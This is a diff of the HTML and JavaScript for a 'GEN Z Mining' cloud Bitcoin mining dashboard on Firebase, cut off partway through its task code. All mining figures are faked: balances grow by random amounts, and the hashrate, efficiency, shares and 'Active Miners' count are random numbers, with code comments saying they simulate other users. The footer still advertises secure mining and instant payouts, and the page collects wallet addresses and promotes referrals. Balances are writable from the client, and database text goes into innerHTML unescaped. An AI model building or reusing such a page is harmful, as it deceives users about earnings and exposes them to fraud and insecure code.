@@ -11,11 +11,18 @@
     :root {
       --primary: #f7931a;
       --primary-dark: #e07b0c;
+      --primary-light: rgba(247, 147, 26, 0.1);
       --dark: #0a0a0a;
       --dark-light: #1a1a1a;
+      --darker: #050505;
       --light: #f8f9fa;
+      --light-dark: #2a2a2a;
       --danger: #dc3545;
+      --danger-dark: #bb2d3b;
       --success: #28a745;
+      --success-dark: #218838;
+      --info: #17a2b8;
+      --warning: #ffc107;
     }
     
     * {
@@ -29,19 +36,27 @@
       background-color: var(--dark);
       color: var(--light);
       line-height: 1.6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
     }
     
     .container {
       max-width: 1200px;
       margin: 0 auto;
       padding: 20px;
+      flex: 1;
     }
     
     /* Header */
     header {
-      background-color: var(--dark-light);
+      background-color: var(--darker);
       padding: 15px 0;
-      border-bottom: 1px solid rgba(255,255,255,0.1);
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+      position: sticky;
+      top: 0;
+      z-index: 100;
     }
     
     .header-container {
@@ -54,6 +69,7 @@
       display: flex;
       align-items: center;
       gap: 10px;
+      text-decoration: none;
     }
     
     .logo i {
@@ -64,6 +80,9 @@
     .logo h1 {
       font-size: 20px;
       font-weight: 700;
+      background: linear-gradient(to right, #f7931a, #ffcc00);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
     
     .user-menu {
@@ -74,15 +93,19 @@
     
     .user-menu span {
       font-weight: 500;
+      color: var(--light);
     }
     
     .btn {
-      padding: 8px 15px;
-      border-radius: 4px;
+      padding: 10px 20px;
+      border-radius: 6px;
       border: none;
       cursor: pointer;
-      font-weight: 500;
+      font-weight: 600;
       transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
     }
     
     .btn-primary {
@@ -92,6 +115,8 @@
     
     .btn-primary:hover {
       background-color: var(--primary-dark);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(247, 147, 26, 0.3);
     }
     
     .btn-danger {
@@ -99,39 +124,77 @@
       color: white;
     }
     
+    .btn-danger:hover {
+      background-color: var(--danger-dark);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(220, 53, 69, 0.3);
+    }
+    
+    .btn-success {
+      background-color: var(--success);
+      color: white;
+    }
+    
+    .btn-success:hover {
+      background-color: var(--success-dark);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(40, 167, 69, 0.3);
+    }
+    
+    .btn-sm {
+      padding: 6px 12px;
+      font-size: 0.85rem;
+    }
+    
     /* Dashboard */
     .dashboard {
       display: grid;
       grid-template-columns: 1fr;
-      gap: 20px;
+      gap: 25px;
       margin-top: 30px;
     }
     
     @media (min-width: 768px) {
       .dashboard {
-        grid-template-columns: 1fr 1fr;
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+    
+    @media (min-width: 1024px) {
+      .dashboard {
+        grid-template-columns: repeat(3, 1fr);
       }
     }
     
     .card {
       background-color: var(--dark-light);
-      border-radius: 8px;
+      border-radius: 10px;
       padding: 20px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.3);
     }
     
     .card-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 15px;
-      padding-bottom: 10px;
+      margin-bottom: 20px;
+      padding-bottom: 15px;
       border-bottom: 1px solid rgba(255,255,255,0.1);
     }
     
     .card-header h2 {
       font-size: 18px;
       font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
     
     .card-header i {
@@ -140,10 +203,11 @@
     }
     
     .balance-amount {
-      font-size: 28px;
+      font-size: 32px;
       font-weight: 700;
       color: var(--primary);
-      margin: 10px 0;
+      margin: 15px 0;
+      font-family: 'Courier New', monospace;
     }
     
     /* Mining Section */
@@ -153,10 +217,10 @@
     }
     
     .mining-btn {
-      padding: 12px 30px;
+      padding: 15px 30px;
       font-size: 16px;
       font-weight: 600;
-      border-radius: 6px;
+      border-radius: 8px;
       width: 100%;
       max-width: 300px;
       margin: 0 auto;
@@ -164,69 +228,123 @@
     }
     
     .mining-stats {
-      display: flex;
-      justify-content: space-around;
-      margin: 20px 0;
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+      margin: 25px 0;
     }
     
     .stat-item {
       text-align: center;
+      background: rgba(255,255,255,0.03);
+      padding: 15px;
+      border-radius: 8px;
+      border: 1px solid rgba(255,255,255,0.05);
     }
     
     .stat-value {
-      font-size: 18px;
-      font-weight: 600;
+      font-size: 20px;
+      font-weight: 700;
       color: var(--primary);
+      margin-bottom: 5px;
+      font-family: 'Courier New', monospace;
     }
     
     .stat-label {
-      font-size: 12px;
-      opacity: 0.8;
+      font-size: 13px;
+      opacity: 0.7;
+      text-transform: uppercase;
+      letter-spacing: 1px;
     }
     
     .mining-progress {
-      height: 8px;
-      background-color: rgba(255,255,255,0.1);
-      border-radius: 4px;
-      margin: 20px 0;
+      height: 10px;
+      background-color: rgba(255,255,255,0.05);
+      border-radius: 5px;
+      margin: 25px 0;
       overflow: hidden;
+      position: relative;
     }
     
     .progress-bar {
       height: 100%;
       width: 0;
-      background-color: var(--primary);
+      background: linear-gradient(90deg, var(--primary), #ffcc00);
       transition: width 0.5s ease;
+      position: relative;
+    }
+    
+    .progress-bar::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(90deg, 
+        rgba(255,255,255,0) 0%, 
+        rgba(255,255,255,0.3) 50%, 
+        rgba(255,255,255,0) 100%);
+      animation: shine 2s infinite;
+    }
+    
+    @keyframes shine {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
     }
     
     /* Forms */
     .form-group {
-      margin-bottom: 15px;
+      margin-bottom: 20px;
     }
     
     .form-label {
       display: block;
-      margin-bottom: 5px;
+      margin-bottom: 8px;
       font-size: 14px;
+      font-weight: 500;
     }
     
     .form-control {
       width: 100%;
-      padding: 10px;
+      padding: 12px 15px;
       background-color: rgba(255,255,255,0.05);
       border: 1px solid rgba(255,255,255,0.1);
-      border-radius: 4px;
+      border-radius: 6px;
       color: white;
+      font-size: 15px;
+      transition: all 0.3s ease;
+    }
+    
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(247, 147, 26, 0.2);
     }
     
     /* Referral */
     .referral-link {
       background-color: rgba(255,255,255,0.05);
-      padding: 10px;
-      border-radius: 4px;
+      padding: 12px;
+      border-radius: 6px;
       font-family: monospace;
       word-break: break-all;
-      margin: 10px 0;
+      margin: 15px 0;
+      border: 1px dashed rgba(255,255,255,0.1);
+      position: relative;
+    }
+    
+    .copy-btn {
+      position: absolute;
+      right: 10px;
+      top: 10px;
+      background: rgba(255,255,255,0.1);
+      border: none;
+      color: var(--light);
+      padding: 3px 8px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 12px;
     }
     
     /* Tasks */
@@ -238,15 +356,29 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 10px;
+      padding: 15px;
       background-color: rgba(255,255,255,0.03);
-      border-radius: 4px;
-      margin-bottom: 8px;
+      border-radius: 8px;
+      margin-bottom: 10px;
+      border: 1px solid rgba(255,255,255,0.05);
+      transition: all 0.3s ease;
+    }
+    
+    .task-item:hover {
+      background-color: rgba(255,255,255,0.05);
+      transform: translateX(5px);
     }
     
     .task-reward {
       color: var(--primary);
-      font-weight: 600;
+      font-weight: 700;
+      font-family: 'Courier New', monospace;
+    }
+    
+    .task-completed {
+      opacity: 0.6;
+      background-color: rgba(40, 167, 69, 0.05);
+      border-color: rgba(40, 167, 69, 0.2);
     }
     
     /* Notification */
@@ -256,44 +388,170 @@
       right: 20px;
       background-color: var(--success);
       color: white;
-      padding: 15px;
-      border-radius: 4px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-      display: none;
+      padding: 15px 20px;
+      border-radius: 8px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      display: flex;
+      align-items: center;
+      gap: 10px;
       z-index: 1000;
+      transform: translateX(200%);
+      transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+      max-width: 350px;
+    }
+    
+    .notification.show {
+      transform: translateX(0);
+    }
+    
+    .notification i {
+      font-size: 20px;
+    }
+    
+    .notification.error {
+      background-color: var(--danger);
+    }
+    
+    .notification.warning {
+      background-color: var(--warning);
+      color: #000;
+    }
+    
+    /* Stats grid */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+    }
+    
+    .stat-card {
+      background: rgba(255,255,255,0.03);
+      padding: 15px;
+      border-radius: 8px;
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    
+    .stat-card .value {
+      font-size: 18px;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 5px;
+    }
+    
+    .stat-card .label {
+      font-size: 13px;
+      opacity: 0.7;
     }
     
     /* Footer */
     footer {
       text-align: center;
-      padding: 20px;
-      margin-top: 40px;
-      font-size: 12px;
+      padding: 25px;
+      margin-top: 50px;
+      font-size: 13px;
       opacity: 0.7;
+      background-color: var(--darker);
+      border-top: 1px solid rgba(255,255,255,0.05);
+    }
+    
+    /* Animations */
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    .pulse {
+      animation: pulse 2s infinite;
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+      .balance-amount {
+        font-size: 28px;
+      }
+      
+      .stat-value {
+        font-size: 18px;
+      }
+      
+      .mining-stats {
+        grid-template-columns: 1fr;
+      }
+      
+      .stats-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    /* Tooltip */
+    .tooltip {
+      position: relative;
+      display: inline-block;
+    }
+    
+    .tooltip .tooltiptext {
+      visibility: hidden;
+      width: 200px;
+      background-color: var(--dark-light);
+      color: var(--light);
+      text-align: center;
+      border-radius: 6px;
+      padding: 10px;
+      position: absolute;
+      z-index: 1;
+      bottom: 125%;
+      left: 50%;
+      transform: translateX(-50%);
+      opacity: 0;
+      transition: opacity 0.3s;
+      font-size: 13px;
+      border: 1px solid rgba(255,255,255,0.1);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+    
+    .tooltip:hover .tooltiptext {
+      visibility: visible;
+      opacity: 1;
+    }
+    
+    /* Countdown timer */
+    .countdown {
+      font-family: 'Courier New', monospace;
+      font-weight: 700;
+      color: var(--primary);
+      font-size: 18px;
     }
   </style>
 </head>
 <body>
   <header>
     <div class="container header-container">
-      <div class="logo">
+      <a href="#" class="logo">
         <i class="fas fa-bitcoin"></i>
         <h1>GEN Z Mining</h1>
-      </div>
+      </a>
       <div class="user-menu">
         <span id="username"></span>
-        <button class="btn btn-danger" onclick="logout()">Logout</button>
+        <button class="btn btn-danger" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
       </div>
     </div>
   </header>
   
   <div class="container">
-    <div class="notification" id="notification"></div>
+    <div class="notification" id="notification">
+      <i class="fas fa-check-circle"></i>
+      <span id="notification-message">Notification message here</span>
+    </div>
     
     <div class="dashboard">
+      <!-- Balance Card -->
       <div class="card">
         <div class="card-header">
           <h2><i class="fas fa-wallet"></i> Account Balance</h2>
+          <i class="fas fa-bitcoin tooltip">
+            <span class="tooltiptext">Your current Bitcoin balance</span>
+          </i>
         </div>
         <div class="balance-amount" id="balance">0.00000 BTC</div>
         <div class="mining-stats">
@@ -303,41 +561,62 @@
           </div>
           <div class="stat-item">
             <div class="stat-value" id="miners">0</div>
-            <div class="stat-label">Miners</div>
+            <div class="stat-label">Active Miners</div>
           </div>
           <div class="stat-item">
-            <div class="stat-value" id="payouts">0</div>
-            <div class="stat-label">Payouts</div>
+            <div class="stat-value" id="minedToday">0.00000</div>
+            <div class="stat-label">Mined Today</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-value" id="totalMined">0.00000</div>
+            <div class="stat-label">Total Mined</div>
           </div>
         </div>
       </div>
       
+      <!-- Mining Control Card -->
       <div class="card">
         <div class="card-header">
-          <h2><i class="fas fa-hammer"></i> Mining Control</h2>
-          <i class="fas fa-power-off"></i>
+          <h2><i class="fas fa-microchip"></i> Mining Control</h2>
+          <i class="fas fa-power-off tooltip">
+            <span class="tooltiptext">Control your mining operation</span>
+          </i>
         </div>
         <div class="mining-status">
-          <button class="btn btn-primary mining-btn" id="miningBtn" onclick="toggleMining()">Start Mining</button>
+          <button class="btn btn-primary mining-btn pulse" id="miningBtn" onclick="toggleMining()">
+            <i class="fas fa-play"></i> Start Mining
+          </button>
           <div class="mining-progress">
             <div class="progress-bar" id="miningProgress"></div>
           </div>
-          <div class="mining-stats">
-            <div class="stat-item">
-              <div class="stat-value" id="minedToday">0.00000</div>
-              <div class="stat-label">Mined Today</div>
+          <div class="stats-grid">
+            <div class="stat-card">
+              <div class="value" id="currentSpeed">0 H/s</div>
+              <div class="label">Current Speed</div>
             </div>
-            <div class="stat-item">
-              <div class="stat-value" id="totalMined">0.00000</div>
-              <div class="stat-label">Total Mined</div>
+            <div class="stat-card">
+              <div class="value" id="avgSpeed">0 H/s</div>
+              <div class="label">Avg. Speed</div>
+            </div>
+            <div class="stat-card">
+              <div class="value" id="shares">0</div>
+              <div class="label">Valid Shares</div>
+            </div>
+            <div class="stat-card">
+              <div class="value countdown" id="nextPayout">00:00:00</div>
+              <div class="label">Next Payout</div>
             </div>
           </div>
         </div>
       </div>
       
+      <!-- Withdraw Card -->
       <div class="card">
         <div class="card-header">
           <h2><i class="fas fa-money-bill-wave"></i> Withdraw Funds</h2>
+          <i class="fas fa-qrcode tooltip">
+            <span class="tooltiptext">Withdraw your mined Bitcoin</span>
+          </i>
         </div>
         <div class="form-group">
           <label class="form-label">Wallet Address</label>
@@ -345,49 +624,82 @@
         </div>
         <div class="form-group">
           <label class="form-label">Amount (BTC)</label>
-          <input type="number" class="form-control" id="withdrawAmount" placeholder="0.00000">
+          <input type="number" class="form-control" id="withdrawAmount" placeholder="0.00000" step="0.00001">
+          <small style="opacity: 0.7; display: block; margin-top: 5px;">Minimum withdrawal: 0.00050 BTC</small>
         </div>
-        <button class="btn btn-primary" onclick="requestWithdraw()">Request Withdrawal</button>
+        <button class="btn btn-primary" onclick="requestWithdraw()">
+          <i class="fas fa-paper-plane"></i> Request Withdrawal
+        </button>
       </div>
       
+      <!-- Referral Card -->
       <div class="card">
         <div class="card-header">
           <h2><i class="fas fa-users"></i> Referral Program</h2>
+          <i class="fas fa-percentage tooltip">
+            <span class="tooltiptext">Earn 10% from your referrals</span>
+          </i>
         </div>
-        <p>Invite friends and earn 10% of their mining rewards!</p>
+        <p style="margin-bottom: 15px;">Invite friends and earn <strong>10%</strong> of their mining rewards for life!</p>
         <div class="form-group">
           <label class="form-label">Your Referral Link</label>
-          <div class="referral-link" id="inviteLink"></div>
+          <div class="referral-link" id="inviteLink">
+            <span id="inviteLinkText"></span>
+            <button class="copy-btn" onclick="copyInviteLink()">
+              <i class="fas fa-copy"></i> Copy
+            </button>
+          </div>
         </div>
-        <div class="form-group">
-          <label class="form-label">Referrals: <span id="referralCount">0</span></label>
-          <label class="form-label">Earned from referrals: <span id="referralEarnings">0.00000 BTC</span></label>
-        </div>
-      </div>
-      
-      <div class="card">
-        <div class="card-header">
-          <h2><i class="fas fa-tasks"></i> Daily Tasks</h2>
-        </div>
-        <div id="taskList" class="task-list">
-          <div class="task-item">
-            <span>Complete your profile</span>
-            <div>
-              <span class="task-reward">+0.001 BTC</span>
-              <button class="btn btn-primary" style="padding: 5px 10px; margin-left: 10px;">Claim</button>
-            </div>
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="value" id="referralCount">0</div>
+            <div class="label">Total Referrals</div>
+          </div>
+          <div class="stat-card">
+            <div class="value" id="referralEarnings">0.00000 BTC</div>
+            <div class="label">Referral Earnings</div>
           </div>
         </div>
       </div>
       
+      <!-- Tasks Card -->
+      <div class="card">
+        <div class="card-header">
+          <h2><i class="fas fa-tasks"></i> Daily Tasks</h2>
+          <i class="fas fa-sync-alt tooltip" onclick="loadTasks()">
+            <span class="tooltiptext">Refresh tasks</span>
+          </i>
+        </div>
+        <div id="taskList" class="task-list">
+          <p style="text-align: center; opacity: 0.7;">Loading tasks...</p>
+        </div>
+      </div>
+      
+      <!-- Statistics Card -->
       <div class="card">
         <div class="card-header">
           <h2><i class="fas fa-chart-line"></i> Mining Statistics</h2>
+          <i class="fas fa-info-circle tooltip">
+            <span class="tooltiptext">Your mining performance</span>
+          </i>
         </div>
-        <div class="form-group">
-          <label class="form-label">24h Earnings: <span id="dailyEarnings">0.00000 BTC</span></label>
-          <label class="form-label">Total Earnings: <span id="totalEarnings">0.00000 BTC</span></label>
-          <label class="form-label">Next Payout: <span id="nextPayout">00:00:00</span></label>
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="value" id="dailyEarnings">0.00000 BTC</div>
+            <div class="label">24h Earnings</div>
+          </div>
+          <div class="stat-card">
+            <div class="value" id="totalEarnings">0.00000 BTC</div>
+            <div class="label">Total Earnings</div>
+          </div>
+          <div class="stat-card">
+            <div class="value" id="uptime">0h 0m</div>
+            <div class="label">Mining Uptime</div>
+          </div>
+          <div class="stat-card">
+            <div class="value" id="efficiency">0%</div>
+            <div class="label">Mining Efficiency</div>
+          </div>
         </div>
       </div>
     </div>
@@ -395,6 +707,9 @@
   
   <footer>
     <p>GEN Z Mining &copy; 2023 | Cloud Bitcoin Mining Platform</p>
+    <p style="margin-top: 5px; font-size: 12px; opacity: 0.5;">
+      <i class="fas fa-shield-alt"></i> Secure Cloud Mining | <i class="fas fa-bolt"></i> Instant Payouts
+    </p>
   </footer>
 
   <script>
@@ -413,27 +728,51 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Elements
-    const notification = document.getElementById('notification');
-    function showNotification(msg, type = 'success') {
-      notification.textContent = msg;
-      notification.style.display = 'block';
-      notification.style.backgroundColor = type === 'success' ? '#28a745' : '#dc3545';
-      setTimeout(() => notification.style.display = 'none', 5000);
+    // Notification system
+    function showNotification(message, type = 'success', duration = 5000) {
+      const notification = document.getElementById('notification');
+      const icon = notification.querySelector('i');
+      const messageEl = document.getElementById('notification-message');
+      
+      // Set content and style
+      messageEl.textContent = message;
+      notification.className = 'notification';
+      notification.classList.add(type);
+      
+      // Set appropriate icon
+      if (type === 'success') {
+        icon.className = 'fas fa-check-circle';
+      } else if (type === 'error') {
+        icon.className = 'fas fa-exclamation-circle';
+      } else if (type === 'warning') {
+        icon.className = 'fas fa-exclamation-triangle';
+      } else {
+        icon.className = 'fas fa-info-circle';
+      }
+      
+      // Show notification
+      notification.classList.add('show');
+      
+      // Hide after duration
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, duration);
     }
 
     // User management
     let username = localStorage.getItem('genz_user') || prompt('Enter your username:');
     if (!username) {
       username = 'user' + Math.floor(Math.random() * 10000);
-      showNotification(`Assigned username: ${username}`);
+      showNotification(`Assigned username: ${username}`, 'info');
     }
     localStorage.setItem('genz_user', username);
     document.getElementById('username').textContent = username;
 
     function logout() { 
-      localStorage.removeItem('genz_user'); 
-      window.location.reload(); 
+      if (confirm('Are you sure you want to logout?')) {
+        localStorage.removeItem('genz_user'); 
+        window.location.reload();
+      }
     }
 
     // User data
@@ -442,7 +781,16 @@
     let mining = false;
     let miningInterval;
     let statsInterval;
+    let uptimeInterval;
+    let miningStartTime = 0;
+    let totalUptime = 0;
+    let completedTasks = [];
+    let currentSpeed = 0;
+    let avgSpeed = 0;
+    let speedReadings = [];
+    let validShares = 0;
 
+    // Initialize user data
     userRef.once('value').then(snap => {
       if (!snap.exists()) {
         const ref = new URLSearchParams(location.search).get('ref') || 'none';
@@ -453,29 +801,75 @@
           wallet_address: '',
           total_mined: 0,
           referrals: 0,
-          referral_earnings: 0
+          referral_earnings: 0,
+          completed_tasks: [],
+          mining_uptime: 0,
+          last_active: new Date().toISOString()
         });
+        
+        // If referred, update referrer's data
+        if (ref !== 'none') {
+          db.ref('users/' + ref).transaction(user => {
+            if (user) {
+              user.referrals = (user.referrals || 0) + 1;
+            }
+            return user;
+          });
+        }
       } else if (snap.val().banned) {
-        document.body.innerHTML = '<h2 style="text-align:center;color:red;margin-top:50px;">Your account has been suspended</h2>';
+        document.body.innerHTML = `
+          <div style="text-align:center; padding:50px 20px;">
+            <h2 style="color:var(--danger); margin-bottom:20px;">
+              <i class="fas fa-ban"></i> Account Suspended
+            </h2>
+            <p style="margin-bottom:30px;">Your account has been suspended for violating our terms of service.</p>
+            <button class="btn btn-primary" onclick="logout()">
+              <i class="fas fa-sign-out-alt"></i> Return to Login
+            </button>
+          </div>
+        `;
         return;
       } else {
         const userData = snap.val();
         balance = parseFloat(userData.balance || 0);
+        totalUptime = userData.mining_uptime || 0;
+        completedTasks = userData.completed_tasks || [];
         updateBalance();
-        document.getElementById('walletInput').value = userData.wallet_address || '';
+        updateStats();
+        
+        // Set wallet address if exists
+        if (userData.wallet_address) {
+          document.getElementById('walletInput').value = userData.wallet_address;
+        }
+        
+        // Update referral stats
         document.getElementById('referralCount').textContent = userData.referrals || 0;
         document.getElementById('referralEarnings').textContent = (userData.referral_earnings || 0).toFixed(5) + ' BTC';
         document.getElementById('totalMined').textContent = (userData.total_mined || 0).toFixed(5) + ' BTC';
       }
     });
 
+    // Update user's last active time every minute
+    setInterval(() => {
+      userRef.update({ last_active: new Date().toISOString() });
+    }, 60000);
+
     // Invite link
-    document.getElementById('inviteLink').textContent = window.location.origin + window.location.pathname + '?ref=' + username;
+    const inviteLink = window.location.origin + window.location.pathname + '?ref=' + username;
+    document.getElementById('inviteLinkText').textContent = inviteLink;
+
+    function copyInviteLink() {
+      navigator.clipboard.writeText(inviteLink).then(() => {
+        showNotification('Referral link copied to clipboard!');
+      }).catch(err => {
+        showNotification('Failed to copy link', 'error');
+      });
+    }
 
     // Global notification
     db.ref('global_notification').on('value', snap => {
       if (snap.val()) {
-        showNotification(snap.val());
+        showNotification(snap.val(), 'info', 10000);
       }
     });
 
@@ -485,49 +879,122 @@
       const progressBar = document.getElementById('miningProgress');
       
       if (!mining) {
+        // Start mining
         mining = true;
-        btn.textContent = 'Stop Mining';
+        miningStartTime = Date.now();
+        btn.innerHTML = '<i class="fas fa-stop"></i> Stop Mining';
+        btn.classList.remove('btn-primary', 'pulse');
         btn.classList.add('btn-danger');
-        btn.classList.remove('btn-primary');
         
         // Start mining animation
         progressBar.style.width = '0';
         setTimeout(() => progressBar.style.width = '100%', 50);
         
-        // Start mining
+        // Start mining interval
         miningInterval = setInterval(() => {
-          const minedAmount = 0.00001 + Math.random() * 0.00002;
-          balance += minedAmount;
+          // Calculate mined amount with some randomness
+          const baseAmount = 0.00001;
+          const randomFactor = 0.5 + Math.random(); // 0.5 to 1.5
+          const minedAmount = baseAmount * randomFactor;
+          
+          // Apply bonus if any
+          const bonusMultiplier = hasCompletedTask('daily_bonus') ? 1.2 : 1;
+          const finalAmount = minedAmount * bonusMultiplier;
+          
+          balance += finalAmount;
+          
+          // Update database
           userRef.update({
-            balance: balance.toFixed(5),
-            total_mined: firebase.database.ServerValue.increment(minedAmount)
+            balance: balance.toFixed(8),
+            total_mined: firebase.database.ServerValue.increment(finalAmount)
           });
+          
+          // Update UI
           updateBalance();
           updateStats();
+          
+          // Add referral earnings if applicable
+          const referredBy = getReferredBy();
+          if (referredBy) {
+            const referralEarning = finalAmount * 0.1; // 10% for referrer
+            db.ref('users/' + referredBy).update({
+              referral_earnings: firebase.database.ServerValue.increment(referralEarning)
+            });
+          }
+          
+          // Simulate finding shares
+          if (Math.random() > 0.7) {
+            validShares++;
+            document.getElementById('shares').textContent = validShares;
+          }
+          
+          // Reset progress bar
+          progressBar.style.width = '0';
+          setTimeout(() => progressBar.style.width = '100%', 50);
         }, 10000);
         
-        // Update stats periodically
+        // Start stats update interval
         statsInterval = setInterval(updateStats, 1000);
         
+        // Start uptime counter
+        uptimeInterval = setInterval(updateUptime, 60000);
+        
+        showNotification('Mining started successfully!', 'success');
       } else {
+        // Stop mining
         mining = false;
         clearInterval(miningInterval);
         clearInterval(statsInterval);
-        btn.textContent = 'Start Mining';
+        clearInterval(uptimeInterval);
+        
+        btn.innerHTML = '<i class="fas fa-play"></i> Start Mining';
         btn.classList.remove('btn-danger');
-        btn.classList.add('btn-primary');
+        btn.classList.add('btn-primary', 'pulse');
         progressBar.style.width = '0';
+        
+        // Update total uptime
+        totalUptime += (Date.now() - miningStartTime) / 1000;
+        userRef.update({ mining_uptime: totalUptime });
+        
+        showNotification('Mining stopped', 'warning');
       }
     }
 
+    function updateUptime() {
+      totalUptime += 60; // Add 1 minute
+      userRef.update({ mining_uptime: totalUptime });
+      
+      // Calculate hours and minutes
+      const hours = Math.floor(totalUptime / 3600);
+      const minutes = Math.floor((totalUptime % 3600) / 60);
+      document.getElementById('uptime').textContent = `${hours}h ${minutes}m`;
+    }
+
     function updateBalance() {
-      document.getElementById('balance').textContent = balance.toFixed(5) + ' BTC';
-      document.getElementById('minedToday').textContent = (balance * 0.1).toFixed(5);
+      document.getElementById('balance').textContent = balance.toFixed(8) + ' BTC';
+      document.getElementById('minedToday').textContent = (balance * 0.1).toFixed(5) + ' BTC';
+      document.getElementById('totalEarnings').textContent = balance.toFixed(5) + ' BTC';
     }
 
     function updateStats() {
-      const hashrate = mining ? (50 + Math.random() * 50).toFixed(2) : '0';
-      document.getElementById('hashrate').textContent = hashrate + ' H/s';
+      // Update speed stats with some realistic fluctuations
+      currentSpeed = 50 + Math.random() * 50;
+      speedReadings.push(currentSpeed);
+      if (speedReadings.length > 10) speedReadings.shift();
+      
+      avgSpeed = speedReadings.reduce((a, b) => a + b, 0) / speedReadings.length || 0;
+      
+      document.getElementById('hashrate').textContent = currentSpeed.toFixed(2) + ' H/s';
+      document.getElementById('currentSpeed').textContent = currentSpeed.toFixed(2) + ' H/s';
+      document.getElementById('avgSpeed').textContent = avgSpeed.toFixed(2) + ' H/s';
+      
+      // Update efficiency (80-95% to simulate real mining)
+      const efficiency = 80 + Math.random() * 15;
+      document.getElementById('efficiency').textContent = efficiency.toFixed(1) + '%';
+      
+      // Update miners count (simulate other users)
+      const miners = 500 + Math.floor(Math.random() * 500);
+      document.getElementById('miners').textContent = miners;
     }
 
     // Withdraw function
@@ -540,8 +1007,18 @@
         return;
       }
       
-      if (isNaN(amount) || amount <= 0 || amount > balance) {
-        showNotification('Invalid withdrawal amount', 'error');
+      if (isNaN(amount) || amount <= 0) {
+        showNotification('Please enter a valid amount', 'error');
+        return;
+      }
+      
+      if (amount < 0.0005) {
+        showNotification('Minimum withdrawal is 0.00050 BTC', 'error');
+        return;
+      }
+      
+      if (amount > balance) {
+        showNotification('Insufficient balance', 'error');
         return;
       }
       
@@ -552,51 +1029,134 @@
       db.ref('withdraw_requests').push({
         username: username,
         wallet: wallet,
-        amount: amount.toFixed(5),
+        amount: amount.toFixed(8),
         status: 'pending',
         timestamp: firebase.database.ServerValue.TIMESTAMP
       });
       
       // Deduct balance
       balance -= amount;
-      userRef.update({ balance: balance.toFixed(5) });
+      userRef.update({ balance: balance.toFixed(8) });
       updateBalance();
       
-      showNotification(`Withdrawal request for ${amount.toFixed(5)} BTC submitted`);
+      showNotification(`Withdrawal request for ${amount.toFixed(8)} BTC submitted`, 'success');
       document.getElementById('withdrawAmount').value = '';
     }
 
-    // Tasks
-    db.ref('global_task').on('value', snap => {
-      const taskList = document.getElementById('taskList');
-      taskList.innerHTML = '';
-      
-      if (snap.exists()) {
-        const task = snap.val();
-        const taskItem = document.createElement('div');
-        taskItem.className = 'task-item';
-        taskItem.innerHTML = `
-          <span>${task}</span>
-          <div>
-            <span class="task-reward">+0.005 BTC</span>
-            <button class="btn btn-primary" style="padding: 5px 10px; margin-left: 10px;" onclick="completeTask()">Claim</button>
-          </div>
-        `;
-        taskList.appendChild(taskItem);
-      } else {
-        taskList.innerHTML = '<p>No tasks available at the moment</p>';
-      }
-    });
+    // Tasks system
+    function loadTasks() {
+      db.ref('global_task').once('value').then(snap => {
+        const taskList = document.getElementById('taskList');
+        taskList.innerHTML = '';
+        
+        if (snap.exists()) {
+          const task = snap.val();
+          
+          // Default tasks
+          const tasks = [
+            {
+              id: 'daily_bonus',
+              title: 'Mine for 1 hour today',
+              reward: 0.001,
+              completed: hasCompletedTask('daily_bonus')
+            },
+            {
+              id: 'refer_friend',
+              title: 'Refer a friend',
+              reward: 0.005,
+              completed: hasCompletedTask('refer_friend')
+            },
+            {
+              id: 'global_task',
+              title: task || 'Complete your profile',
+              reward: 0.002,
+              completed: hasCompletedTask('global_task')
+            }
+          ];
+          
+          tasks.forEach(task => {
+            const taskItem = document.createElement('div');
+            taskItem.className = `task-item ${task.completed ? 'task-completed' : ''}`;
+            taskItem.innerHTML = `
+              <span>${task.title}</span>
+              <div>
+                <span class="task-reward">+${task.reward.toFixed(3)} BTC</span>
+                ${task.completed ? 
+                  '<span style="color:var(--success);"><i class="fas fa-check"></i> Completed</span>' : 
+                  `<button class="btn btn-success btn-sm" onclick="completeTask('${task.id}', ${task.reward})">
+                    <i class="fas fa-check"></i> Claim
+                  </button>`
+                }
+              </div>
+            `;
+            taskList.appendChild(taskItem);
+          });
+        } else {
